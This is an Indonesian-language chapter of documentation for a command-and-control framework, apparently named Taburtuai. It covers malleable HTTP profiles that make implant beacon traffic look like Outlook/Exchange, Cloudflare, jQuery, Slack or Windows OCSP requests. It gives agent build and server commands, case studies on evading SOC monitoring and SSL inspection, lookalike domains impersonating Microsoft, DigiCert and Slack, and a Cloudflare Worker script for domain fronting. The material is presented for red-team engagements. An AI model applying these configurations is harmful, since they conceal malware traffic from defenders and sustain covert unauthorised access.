# 17 — Malleable HTTP Profiles

> Malleable C2 profiles mengubah "tampilan" lalu lintas jaringan antara agent dan server,
> sehingga traffic C2 menyerupai aplikasi atau layanan yang sah dan tidak terlihat mencurigakan
> bagi IDS/IPS, SIEM, maupun analis SOC.

---

## Mengapa Ini Penting?

Setiap C2 yang berjalan dengan konfigurasi default meninggalkan **network signature** yang sangat khas:

```
POST /api/v1/checkin HTTP/1.1
Host: 185.220.xxx.xxx:8080
User-Agent: Go-http-client/1.1
Content-Type: application/json
```

Seorang analis SOC atau IDS rule langsung bisa mendeteksi:
- URI `/api/v1/checkin` — tidak ada aplikasi sah yang pakai path ini
- `User-Agent: Go-http-client` — bukan browser, tapi eksplisit Go binary
- IP asing tanpa domain, port non-standar
- Interval request yang konsisten (beacon pattern)

**Dengan malleable profiles**, traffic yang sama terlihat seperti:

```
POST /autodiscover/autodiscover.xml HTTP/1.1
Host: 185.220.xxx.xxx:443
User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17928; Pro)
Content-Type: application/json
X-MS-Exchange-Organization-AuthSource: corp.local
X-AnchorMailbox: SystemMailbox{1f05a927}@corp.local
```

Analis melihat ini: *"Oh, Outlook lagi sync email ke Exchange. Normal."*

---

## Konsep Dasar

### Komponen yang Diubah Profile

| Komponen | Default | Contoh Office365 |
|---|---|---|
| Checkin URI | `/api/v1/checkin` | `/autodiscover/autodiscover.xml` |
| Command poll URI | `/api/v1/command/{id}/next` | `/ews/exchange.asmx/{id}` |
| Result submit URI | `/api/v1/command/result` | `/mapi/emsmdb` |
| User-Agent | Chrome generic | Microsoft Outlook 16.0 |
| HTTP Headers | Content-Type only | X-MS-Exchange-*, Prefer |

### Cara Kerja

```
[Agent]                          [Server]
  │                                  │
  ├─ POST /autodiscover/...  ──────►  ├─ Route alias → AgentCheckin handler
  │  Header: User-Agent: Outlook     │
  │  Header: X-MS-Exchange-*         │
  │                                  │
  ├─ GET /ews/exchange.asmx/{id} ──► ├─ Route alias → GetNextCommand handler
  │                                  │
  ├─ POST /mapi/emsmdb ──────────►   ├─ Route alias → SubmitCommandResult handler
  │                                  │
```

Server mendaftarkan **dua set route**:
- Set standar `/api/v1/*` — selalu aktif (untuk operator CLI)
- Set alias sesuai profile — aktif ketika `--profile` diset

---

## Semua Profile yang Tersedia

### `default` — Taburtuai Standard

Profile bawaan. Tidak ada masquerading. Cocok untuk lab atau jaringan internal
di mana network monitoring tidak ketat.

```
Checkin URI : /api/v1/checkin
Command URI : /api/v1/command/{id}/next
Result URI  : /api/v1/command/result
User-Agent  : Chrome 124 generic
```

**Kapan pakai:** Lab testing, internal engagement, saat speed lebih penting dari stealth.

---

### `office365` — Microsoft Exchange / EWS

Menyamar sebagai Microsoft Outlook yang sync email ke Exchange Web Services.
Sangat efektif di environment korporat yang mengizinkan O365 traffic.

```
Checkin URI : /autodiscover/autodiscover.xml
Command URI : /ews/exchange.asmx/{id}
Result URI  : /mapi/emsmdb

Headers:
  X-MS-Exchange-Organization-AuthSource: corp.local
  X-MS-Exchange-Forest-RulesExecuted: true
  X-AnchorMailbox: SystemMailbox{...}@corp.local
  X-MS-Exchange-Organization-SCL: -1
  Prefer: exchange.behavior.version=2

User-Agents:
  Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17928; Pro)
  Microsoft Office/16.0 (Windows NT 10.0; Microsoft Word 16.0.17928; Pro)
  Autodiscover/1.0 (Microsoft Office/16.0 (Windows NT 10.0))
```

**Kapan pakai:**
- Target menggunakan Office 365 / Exchange
- Defender memantau outbound HTTP tapi izinkan Exchange traffic
- Engagement yang memerlukan traffic blend in dengan corporate email

**Keunggulan:** Exchange/Autodiscover adalah traffic yang sangat umum dan
hampir tidak pernah di-block di environment korporat.

---

### `cdn` — Cloudflare CDN Edge

Menyamar sebagai request ke Cloudflare CDN edge network. Header CF-* adalah
header standar yang ditambahkan Cloudflare ke setiap request yang melewati CDN mereka.

```
Checkin URI : /cdn-cgi/rum
Command URI : /cdn-cgi/challenge-platform/h/b/flow/{id}
Result URI  : /cdn-cgi/zaraz/t

Headers:
  CF-IPCountry: US
  CF-Visitor: {"scheme":"https"}
  X-Forwarded-For: 1.1.1.1
  CDN-Loop: cloudflare
  X-Forwarded-Proto: https

User-Agents: Chrome/Edge browser pool
```

**Kapan pakai:**
- Target menggunakan Cloudflare (atau provider CDN lain)
- Ingin traffic terlihat seperti CDN telemetry / analytics
- Environment dengan strict egress filtering yang tetap izinkan CDN

**Catatan:** `/cdn-cgi/rum` adalah endpoint Real User Monitoring Cloudflare yang
memang sering dipanggil browser secara otomatis.

---

### `jquery` — Static Asset / jQuery CDN

Menyamar sebagai request ke jQuery atau static asset JavaScript. Browser secara
rutin meminta file `.js` dari CDN, sehingga traffic ini sangat umum.

```
Checkin URI : /assets/js/jquery-3.7.1.min.js
Command URI : /assets/js/bundle.{id}.min.js
Result URI  : /assets/js/vendors~main.chunk.js

Content-Type: application/x-www-form-urlencoded

Headers:
  Referer: https://code.jquery.com/
  X-Requested-With: XMLHttpRequest
  Origin: https://code.jquery.com

User-Agents: Chrome, Firefox, Safari pool
```

**Kapan pakai:**
- Environment web development / hosting
- Target memiliki banyak traffic ke CDN JavaScript
- Ingin traffic terlihat seperti web app yang loading scripts

**Keunggulan:** File `.min.js` tidak pernah dicurigai karena browser selalu
meminta banyak file JS dari berbagai CDN.

---

### `slack` — Slack Web API

Menyamar sebagai Slack desktop app yang melakukan API calls. Slack sangat
umum di workspace korporat modern.

```
Checkin URI : /api/users.identity
Command URI : /api/conversations.history/{id}
Result URI  : /api/chat.postMessage

Headers:
  Authorization: Bearer xoxb-placeholder-token
  X-Slack-Retry-Num: 0
  X-Slack-No-Retry: 1
  X-Slack-Request-Timestamp: 1714924512

User-Agents:
  Slack SSB/4.35.126 (Win32 NT 10.0.22621; x64)
  Slack/4.35.126 (Windows 10; 64-bit; +https://slack.com)
```

**Kapan pakai:**
- Target menggunakan Slack sebagai alat komunikasi
- Environment yang aggressively monitor traffic tapi whitelist Slack
- Engagement di perusahaan tech/startup yang sangat bergantung Slack

---

### `ocsp` — Certificate Validation (Paling Stealth)

Menyamar sebagai validasi sertifikat TLS (OCSP — Online Certificate Status Protocol).
Ini adalah traffic yang **paling tidak mencolok** karena setiap Windows host melakukan
OCSP check secara otomatis saat membuka koneksi HTTPS.

```
Checkin URI : /ocsp
Command URI : /ocsp/{id}
Result URI  : /crl/root.crl

Content-Type: application/ocsp-request

Headers:
  Cache-Control: no-cache
  Pragma: no-cache

User-Agents:
  Microsoft-CryptoAPI/10.0
  Microsoft-WinHTTP/5.1
  CertUtil URL Agent
```

**Kapan pakai:**
- Engagement dengan SOC yang sangat mature
- Environment dengan deep packet inspection
- Ingin traffic yang benar-benar blend in dengan OS behavior

**Keunggulan:** `Microsoft-CryptoAPI` adalah user-agent yang dibuat Windows sendiri
saat melakukan certificate validation. TIDAK ADA yang mencurigai Windows mengecek
sertifikat TLS — ini adalah perilaku OS yang sangat normal.

---

## Cara Penggunaan

### Step 1 — Build Agent dengan Profile

```bash
# Office365 profile
make agent-win-stealth \
  C2_SERVER=https://c2.yourdomain.com \
  ENC_KEY=C0rp3ngag3m3nt2026 \
  PROFILE=office365 \
  INTERVAL=60 \
  JITTER=30 \
  KILL_DATE=2026-06-30

# CDN profile
make agent-win-stealth \
  C2_SERVER=https://c2.yourdomain.com \
  ENC_KEY=C0rp3ngag3m3nt2026 \
  PROFILE=cdn

# OCSP — paling stealth
make agent-win-stealth \
  C2_SERVER=https://c2.yourdomain.com \
  ENC_KEY=C0rp3ngag3m3nt2026 \
  PROFILE=ocsp \
  INTERVAL=120 \
  JITTER=40
```

**PENTING:** Profile yang di-build ke agent **harus sama** dengan profile yang
dijalankan di server. Kalau mismatch, agent tidak akan bisa connect.

---

### Step 2 — Jalankan Server dengan Profile yang Sama

```bash
# Harus pakai profile yang sama dengan agent
ENCRYPTION_KEY=C0rp3ngag3m3nt2026 ./bin/server \
  --port 443 \
  --profile office365

# Output startup:
#   addr     0.0.0.0:443
#   auth     false
#   profile  office365
#   logs     ./logs
#   db       ./data/taburtuai.db
```

Server akan otomatis mendaftarkan route alias:
```
POST /autodiscover/autodiscover.xml  → checkin
GET  /ews/exchange.asmx/:id          → command poll
POST /mapi/emsmdb                    → result submit
```

---

### Step 3 — Verifikasi Traffic

Dari operator, jalankan agent dan lihat agent checkin masuk:

```
taburtuai(c2.yourdomain.com:443) › agents list
[+] 1 agent(s) registered:

ID        HOSTNAME          USER         OS        STATUS
2703886d  CORP-LAPTOP-JD01  CORP\john    Windows   online

taburtuai › agents info 2703886d
# Semua informasi agent muncul normal
# Di sisi server, log mencatat checkin via alias URI
```

Di Wireshark atau network monitor target, traffic terlihat:
```
POST /autodiscover/autodiscover.xml HTTP/1.1
Host: c2.yourdomain.com
User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook ...)
```

---

### Referensi Cepat — Pasangan Profile

| PROFILE agent | Flag server | URI yang dipakai |
|---|---|---|
| `default` | `--profile default` (atau tanpa flag) | `/api/v1/*` |
| `office365` | `--profile office365` | `/autodiscover/...`, `/ews/...`, `/mapi/...` |
| `cdn` | `--profile cdn` | `/cdn-cgi/*` |
| `jquery` | `--profile jquery` | `/assets/js/*.min.js` |
| `slack` | `--profile slack` | `/api/users.identity`, `/api/conversations.*` |
| `ocsp` | `--profile ocsp` | `/ocsp`, `/crl/root.crl` |

---

## Studi Kasus

### Studi Kasus 1: Bypass DLP / HTTPS Inspection di Perusahaan Retail

**Situasi:**

Target adalah perusahaan retail besar. Network team mereka menjalankan SSL inspection
(MITM proxy) untuk semua traffic kecuali whitelist tertentu. Mereka juga punya SIEM
yang alert kalau ada koneksi ke IP asing yang tidak dikenal.

**Masalah:**
- Kalau pakai default profile: `POST /api/v1/checkin` langsung di-block dan di-alert
- IP C2 asing tidak masuk whitelist
- Beacon pattern (request setiap 60 detik) akan terdeteksi

**Solusi — Profile `cdn` + Domain Fronting:**

```bash
# 1. Setup C2 di belakang Cloudflare (domain fronting)
#    Domain: legit-looking.com → Cloudflare → C2 VPS
#    Agent connect ke Cloudflare, bukan langsung ke VPS

# 2. Build agent CDN profile
make agent-win-stealth \
  C2_SERVER=https://legit-looking.com \
  ENC_KEY=R3t41l3ng2026! \
  PROFILE=cdn \
  INTERVAL=180 \          # 3 menit — lebih natural untuk CDN analytics
  JITTER=50               # 50% jitter = antara 90-270 detik

# 3. Jalankan server dengan profile cdn
ENCRYPTION_KEY=R3t41l3ng2026! ./bin/server --port 443 --profile cdn
```

**Hasilnya:**
- Traffic ke Cloudflare IP — sudah pasti di whitelist (Cloudflare dipakai jutaan situs)
- Header CF-* membuat traffic terlihat seperti CDN telemetry — sangat normal
- Interval 3 menit dengan jitter tinggi — tidak ada beacon pattern yang jelas
- SSL inspection bypass karena traffic ke Cloudflare yang trusted

---

### Studi Kasus 2: Persistent Access di Environment Korporat dengan O365

**Situasi:**

Engagement red team di perusahaan finance yang semua komunikasi pakai Microsoft 365.
SOC mereka memantau semua traffic keluar dan punya alert untuk "unusual outbound HTTP".
Exchange/Outlook traffic sudah pasti di-whitelist.

**Setup:**

```bash
# 1. Build agent dengan profile office365 dan kill date sesuai engagement
make agent-win-stealth \
  C2_SERVER=https://mail-gateway.corpname-redir.com \
  ENC_KEY=F1n4nc3R3dt3am! \
  PROFILE=office365 \
  INTERVAL=300 \          # 5 menit — seperti Outlook sync interval default
  JITTER=20 \
  KILL_DATE=2026-07-31

# 2. Server dengan profile office365
ENCRYPTION_KEY=F1n4nc3R3dt3am! ./bin/server --port 443 --profile office365

# 3. Hasil traffic dari target:
#    POST /autodiscover/autodiscover.xml  ← terlihat seperti Outlook sync
#    GET  /ews/exchange.asmx/<agent_id>   ← terlihat seperti EWS polling
#    POST /mapi/emsmdb                    ← terlihat seperti MAPI request
```

**Di SIEM target:**
```
[INFO] Outbound HTTPS to mail-gateway.corpname-redir.com:443
       User-Agent: Microsoft Office/16.0 (Outlook)
       Pattern: Periodic sync every ~5min
       Status: NORMAL — Exchange sync traffic
```

Analis SOC melihat ini sebagai traffic Outlook biasa. ✓

**Kenapa nama domain `mail-gateway.corpname-redir.com`?**
Domain yang mengandung kata seperti "mail", "gateway", "corp" terlihat lebih
legitimate sebagai tujuan Exchange traffic.

---

### Studi Kasus 3: Long-Term Covert Access — OCSP Profile

**Situasi:**

Engagement APT simulation. Klien minta simulasi threat actor yang bisa bertahan
lama (6+ bulan) tanpa terdeteksi. SOC mereka sangat mature: EDR, network monitoring,
behavioral analysis, dan anomaly detection.

**Strategi:**

Gunakan `ocsp` profile dengan interval panjang dan jitter sangat tinggi untuk
menyerupai perilaku validasi sertifikat yang dilakukan Windows secara organik.

```bash
# 1. Build agent dengan ocsp profile
make agent-win-stealth \
  C2_SERVER=https://ocsp.trusted-ca-revoke.com \
  ENC_KEY=APTs1mul4t10n2026 \
  PROFILE=ocsp \
  INTERVAL=3600 \       # 1 jam — OCSP check tidak perlu sering
  JITTER=60 \           # 60% jitter = antara 24 menit s/d 1 jam 36 menit
  KILL_DATE=2026-12-31

# 2. Server
ENCRYPTION_KEY=APTs1mul4t10n2026 ./bin/server --port 443 --profile ocsp

# 3. Traffic yang terlihat di target:
#    POST /ocsp  HTTP/1.1
#    Host: ocsp.trusted-ca-revoke.com
#    User-Agent: Microsoft-CryptoAPI/10.0
#    Content-Type: application/ocsp-request
#    Cache-Control: no-cache
```

**Di network log target:**
```
[2026-05-15 09:23:41] HTTPS POST ocsp.trusted-ca-revoke.com/ocsp
                       UA: Microsoft-CryptoAPI/10.0 — Certificate validation
[2026-05-15 11:07:18] HTTPS POST ocsp.trusted-ca-revoke.com/ocsp
                       UA: Microsoft-CryptoAPI/10.0 — Certificate validation
```

Analis melihat dua OCSP request dengan selisih ~1 jam 40 menit. Ini **sangat normal** —
Windows melakukan OCSP check saat TLS handshake terjadi, dan dengan jitter tinggi,
tidak ada pola yang jelas.

**Catatan penting untuk domain OCSP:**
Pilih nama domain yang terlihat seperti CA (Certificate Authority) root:
- `ocsp.trusted-ca-revoke.com`
- `crl.microsoft-certificate.net`
- `validation.digicert-ocsp.com`
Domain seperti ini sangat jarang di-block karena terlihat seperti infrastructure PKI.

---

## Tips Operasional

### Pilih Profile Berdasarkan Target Environment

```
Target pakai Office 365?  → office365
Target di-protect Cloudflare? → cdn
Target environment developer/startup? → jquery atau slack
Target dengan SOC mature + behavioral analysis? → ocsp
Lab/internal testing? → default
```

### Jangan Lupa Sesuaikan Interval

Setiap profile punya "natural interval" yang terlihat realistis:

| Profile | Interval Realistis | Alasan |
|---|---|---|
| `office365` | 300s (5 menit) | Outlook sync interval default |
| `cdn` | 120-300s | CDN analytics tidak terlalu frequent |
| `jquery` | 60-120s | Lazy loading JavaScript normal |
| `slack` | 30-60s | Slack WebSocket check interval |
| `ocsp` | 1800-3600s | OCSP check tidak perlu sering |

### Domain Name Matters

Nama domain C2 harus konsisten dengan profile yang dipilih:

```
office365 → mail.corp-exchange-gateway.com
            autodiscover.company-o365.net

cdn       → assets.cdn-delivery-network.com
            static.cloudflare-content.net

jquery    → cdn.jquery-static-assets.com
            assets.js-delivery.net

slack     → api.slack-workspace.net
            hooks.slack-integration.com

ocsp      → ocsp.trusted-root-ca.com
            crl.certificate-authority.net
```

---

## Domain Fronting

Domain fronting adalah teknik lanjutan yang **digabungkan** dengan malleable profiles
untuk menyembunyikan identitas server C2 yang sebenarnya. Ini adalah lapisan kedua
setelah profile mengubah tampilan traffic.

### Konsep

Tanpa domain fronting:
```
[Agent]  ──HTTPS──►  [IP C2: 185.220.xxx.xxx:443]
                       TLS SNI: c2.yourdomain.com
                       Host:    c2.yourdomain.com
                       ↑ Firewall bisa block IP ini
```

Dengan domain fronting:
```
[Agent]  ──HTTPS──►  [CDN: Cloudflare/AWS CloudFront]
                       TLS SNI: cdn-worker.workers.dev   ← yang terlihat di network
                       Host:    c2.yourdomain.com         ← dikirim di dalam HTTPS
                       CDN meneruskan ke backend berdasarkan Host header
                       ↑ Firewall hanya melihat koneksi ke CDN yang trusted
```

Firewall atau IDS hanya bisa melihat:
- IP tujuan: IP Cloudflare/AWS (terpercaya, tidak bisa di-block tanpa breaking internet)
- TLS SNI: domain CDN (terlihat legitimate)

Isi HTTP request (termasuk Host header) ada di dalam TLS tunnel — **tidak terlihat**
tanpa SSL inspection, dan bahkan kalau ada SSL inspection, CDN trusted cert tidak
akan di-intercept.

### Setup Domain Fronting

**Prasyarat:**
- Domain C2 (`c2.yourdomain.com`) sudah di-proxy oleh CDN (Cloudflare, AWS CloudFront, Fastly)
- CDN dikonfigurasi untuk forward request ke C2 server berdasarkan Host header
- `C2_SERVER` = URL ke CDN endpoint (bukan IP C2 langsung)
- `FRONT_DOMAIN` = domain C2 asli (yang CDN gunakan untuk routing)

**Build agent:**
```bash
# Tanpa domain fronting (koneksi langsung ke C2)
make agent-win-stealth \
  C2_SERVER=https://c2.yourdomain.com \
  ENC_KEY=KEY \
  PROFILE=office365

# Dengan domain fronting via Cloudflare Workers
make agent-win-stealth \
  C2_SERVER=https://taburtuai-worker.mjopsec.workers.dev \
  ENC_KEY=KEY \
  PROFILE=office365 \
  FRONT_DOMAIN=c2.yourdomain.com
```

**Apa yang terjadi saat agent connect:**
```
# Agent melakukan koneksi TCP+TLS ke:
  taburtuai-worker.mjopsec.workers.dev  ← IP Cloudflare

# Setelah TLS tunnel terbentuk, HTTP request yang dikirim:
  POST /autodiscover/autodiscover.xml HTTP/1.1
  Host: c2.yourdomain.com               ← override lewat FRONT_DOMAIN
  User-Agent: Microsoft Office/16.0 ...
  Content-Type: application/json

# Cloudflare membaca Host header → forward ke c2.yourdomain.com
# C2 server menerima request normal dan merespons
```

**Di network monitor target:**
```
# Yang terlihat:
Destination IP : 104.21.xxx.xxx (Cloudflare IP — trusted)
TLS SNI        : taburtuai-worker.mjopsec.workers.dev
                 ↑ bukan IP C2, bukan domain C2
```

### Contoh Setup Cloudflare Worker (CDN Front)

Buat Cloudflare Worker sebagai reverse proxy ke C2:

```javascript
// worker.js — deploy ke Cloudflare Workers
export default {
  async fetch(request) {
    const url = new URL(request.url);
    // Ganti hostname ke C2 backend yang sebenarnya
    url.hostname = "c2.yourdomain.com";

    const modifiedRequest = new Request(url.toString(), {
      method: request.method,
      headers: request.headers,
      body: request.body,
    });

    return fetch(modifiedRequest);
  },
};
```

Deploy:
```bash
wrangler deploy worker.js --name taburtuai-worker
# URL: https://taburtuai-worker.mjopsec.workers.dev
```

Gunakan URL worker sebagai `C2_SERVER` dan domain C2 asli sebagai `FRONT_DOMAIN`.

### Kombinasi Optimal

| Situasi | Profile | Front Domain |
|---|---|---|
| SOC basic, no DPI | `office365` | tidak perlu |
| Firewall ketat, IP C2 di-block | `cdn` | Cloudflare Worker |
| SSL inspection aktif | `ocsp` | AWS CloudFront |
| Target enterprise O365 + DPI | `office365` | Cloudflare Worker |
| Engagement APT simulation | `ocsp` | AWS CloudFront / Azure CDN |

### Catatan Penting

1. **CDN harus dikonfigurasi** untuk menerima dan meneruskan request dari agent.
   Tidak semua CDN mendukung arbitrary Host header forwarding.

2. **Cloudflare Free** — Workers gratis, tapi ada rate limit 100,000 request/hari.
   Cukup untuk most engagements.

3. **AWS CloudFront** — lebih reliable untuk high-volume, tapi butuh konfigurasi
   Origin dan Distribution.

4. **req.Host vs req.Header** — di Go, Host header hanya bisa di-override lewat
   `req.Host`, bukan `req.Header.Set("Host", ...)`. Implementasi sudah benar.

5. **Jangan gunakan IP langsung** sebagai `C2_SERVER` saat domain fronting —
   pakai domain CDN agar TLS SNI terlihat legitimate.

---

**Selanjutnya:** [18 — OPSEC Hardening](18-opsec-hardening.md) — enkripsi string compile-time dan Authenticode self-signing untuk implant yang lebih sulit dianalisis.

*Atau lihat* [16 — Red Team Scenarios](16-scenarios.md) untuk contoh penggunaan profile dalam engagement end-to-end.
